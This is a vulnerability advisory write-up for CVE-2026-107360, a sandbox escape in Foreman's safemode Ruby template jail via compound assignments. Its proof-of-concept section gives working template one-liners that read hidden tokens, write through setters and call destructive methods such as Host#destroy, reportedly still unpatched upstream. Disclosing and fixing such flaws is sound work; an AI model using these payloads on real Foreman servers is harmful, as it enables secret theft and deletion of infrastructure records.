---
title: "Escaping Foreman's Template Sandbox with a Compound Assignment"
date: 2026-11-12
target: "theforeman/safemode"
severity: Critical
identifier: "CVE-2026-107360"
advisory_url: "https://bugzilla.redhat.com/show_bug.cgi?id=2547645"
summary: "safemode rewrites every method call in template code into receiver.to_jail.method so the per-class Jail allow-list mediates it. Compound assignments are left out of that rewrite, so x.foo ||= v, x.foo &&= v and x[k] += v call getters, setters and index operators on the real object. A template-only Foreman user can reach Host#destroy. CVE-2026-107360."
---

## Summary

safemode is the Ruby sandbox Foreman uses to evaluate template content. Its policy is simple to state: every method call in the sandboxed code is rewritten to go through a per-class `Jail` object, and that object only exposes an allow-list of methods. The rewrite is done in the parser, by inserting `.to_jail` on the receiver of every call.

Compound assignment expressions never get that treatment. `x.foo += v`, `x.foo ||= v`, `x.foo &&= v`, `x&.foo += v` and `x[k] += v` are emitted with the raw receiver, so the getter, the setter and the `[]`/`[]=` operators run directly on the real object the renderer put into scope.

That turns the allow-list into a suggestion. A user who can influence template content, with no other privilege, can read attributes the Jail deliberately hides, write through setters, and call arbitrary no-argument methods on live objects. In a default Foreman render scope that includes `@host`, so `x.destroy ||= 0` deletes the host record.

This is CVE-2026-107360, published on 2026-11-12. I reported it on 2026-10-02 and Foreman Security confirmed the impact.

## Background

Foreman renders provisioning templates, reports and notifications with ERB. Because templates can come from users who are not administrators, the renderer evaluates them inside `Safemode::Box`, and the box installs objects such as `@host` into the template scope.

safemode's defense is a source rewrite, not a separate interpreter. The parser walks the AST and turns

```ruby
@host.name
```

into

```ruby
@host.to_jail.name
```

`to_jail` returns a `Jail` wrapper whose method_missing consults a per-class allow-list. `Host::Jail`, for example, exposes readers and a few safe operations, and explicitly does not expose `destroy`. The design assumes the rewrite is total: if a call can be expressed without going through `to_jail`, the allow-list does not apply.

The project has been through this boundary twice already this year, with CVE-2026-96658 (instance variable access through `instance_variable_get`) and CVE-2026-96659 (preview permission). Both were fixed by closing the specific escape. This one is a different door into the same room.

## Root cause

`lib/safemode/parser.rb` keeps the compound-assignment nodes on the allowed list and documents why they are special:

```ruby
# NOTE: op_asgn*/safe_op_asgn* do not insert .to_jail on the
# receiver. Setters are called directly on the real object, bypassing Jail.
:op_asgn, :op_asgn1, :op_asgn2, :op_asgn_and, :op_asgn_or,
:safe_op_asgn, :safe_op_asgn2,
```

That comment is not a bug report, it is a description of the behaviour the code intends. The parser emits those nodes unchanged, Ruby evaluates the receiver's methods on the object itself, and the Jail never sees the call.

The transformed code makes the asymmetry visible. Running the parser's own dump on 2.0.2:

```
=== SOURCE: @acct.api_token ===> @acct.to_jail.api_token     # normal call: receiver jailed
=== SOURCE: x = @acct; x.api_token ||= "" ===> x = @acct
                                               x.api_token ||= ""   # no .to_jail anywhere
```

The versions affected are the 2.x line. The op-assign support entered the parser in `b1701de` in May 2026, and the behaviour is identical on 2.0.1, 2.0.2 and 2.0.3.

## Proof of concept

The harness builds a small account object with a secret, a setter, a side-effecting method and a destructive method, wraps it in a Jail that blocks all of them, and evaluates template snippets through `Safemode::Box`.

```ruby
# blocked: the Jail does not allow api_token
@acct.api_token                      # => Safemode::NoMethodError

# bypass: compound assignment calls the getter on the real object
x = @acct; x.api_token ||= ""        # => "TOKEN-1234-supersecret"

# bypass: write through the setter
x.api_token &&= "ROTATED-BY-TEMPLATE"

# bypass: index form, op_asgn1
x[:api_token] &&= "IDX-ROTATED"

# bypass: arbitrary no-argument method, including destructive ones
x.revoke_all_sessions ||= 0          # side effect happens, returns cleanly
x.destroy ||= 0                      # destructive method runs
```

In Foreman the same shape reaches the render scope. `x = @host; x.destroy ||= 0` deletes the host, and Foreman Security confirmed that a template-only user can do it.

## Observed behaviour

Harness: Ruby 3.3.8 with prism 1.9.0, ruby2ruby 2.6.2 and sexp_processor 4.17.6. The 14 checks cover disclosure, setter writes, index reads and writes, and method invocation, with a control that shows the plain call is blocked by the Jail.

Against `safemode` 2.0.2, the release that was current when I reported it:

```
OK   x.api_token ||= "" discloses allow-listed-out value
       => "TOKEN-1234-supersecret"
OK   x.api_token &&= ... rotated the token
OK   x[:api_token] &&= ... rotated the token
OK   x.revoke_all_sessions ||= 0 returned cleanly
OK   x.destroy ||= 0 returned cleanly
RESULT: bypass confirmed on this checkout (vulnerable).
```

Against 2.0.3, the latest release at the time of writing, the same harness prints the same result. The version bump added a node allow-list for unreviewed parser nodes, but `op_asgn` and its siblings are still on the list, with the same comment above them.

That matters for anyone reading the CVE: as of 2026-11-12 there is no upstream release that contains a fix for this specific bypass. Check your downstream vendor's build rather than assuming the version number covers it.

## Impact

The Jail is the only boundary between template content and the Ruby objects in the render scope. A bypass is not a small leak of one attribute: it is the ability to call any zero-argument method on any object the renderer exposes. In the Foreman scope that includes hosts, users, settings and the objects the template helpers build.

The concrete consequences, in the order the CVE describes them:

- read values the Jail excludes, such as API tokens and other secrets on scope objects;
- write through setters, changing state the template has no business changing;
- invoke side-effecting methods, including `Host#destroy`, which deletes the record.

The actor needs to influence template content, which in Foreman means a user who can create or edit a template, a report template, or a preview. That is the `PR:L` in the vector and it is exactly the user the sandbox exists for.

CVSS 3.1: `AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:N` = 9.6. The scope change matches how the project scored the earlier escapes in this component. With `S:U` the same issue is 8.1, which is the conservative reading if you consider the render scope part of the same trust boundary.

## Fix

There is no fixed release in the upstream repository today. The durable fix is to make the op-assign path obey the same rule as every other call: either remove those node types from the allowed list and let legitimate templates fail, or emit the receiver through `to_jail` before the getter/setter/index call.

A parser-side patch that closes the common forms:

```ruby
# reject compound assignment outright; templates can write x = x + 1 instead
ALLOWED_NODES.delete(:op_asgn)
ALLOWED_NODES.delete(:op_asgn1)
ALLOWED_NODES.delete(:op_asgn2)
ALLOWED_NODES.delete(:op_asgn_and)
ALLOWED_NODES.delete(:op_asgn_or)
ALLOWED_NODES.delete(:safe_op_asgn)
ALLOWED_NODES.delete(:safe_op_asgn2)
```

Until a fixed build is available, the practical mitigation is to keep untrusted users away from template editing and preview, and to review any template that contains `||=`, `&&=`, `+=` or indexed assignment against a non-local variable. Filtering the source is weaker than the parser fix, because there are many spellings, but it removes the trivial path.

## Timeline

- **2026-10-02**: reported to `foreman-security@googlegroups.com` with the 14-check PoC and the transform dump.
- **2026-10-03**: Foreman Security acknowledged, confirmed the impact, and handed coordination to Red Hat.
- **2026-10-07**: Red Hat PSIRT opened PSIRTSUPT-25192 and reserved a CVE.
- **2026-10-08**: CVE-2026-107360 assigned; embargo coordinated with three related component reports.
- **2026-11-12**: CVE record made public (Red Hat Bugzilla 2547645). The text credits Kaya Emre Arikan (GitHub @kemrec).
- **2026-11-12**: PoC re-run against 2.0.3, the current release. The bypass still works.

## Credit

Reported by Kaya Emre Arikan (GitHub [@kemrec](https://github.com/kemrec)). The CVE record lists the same.
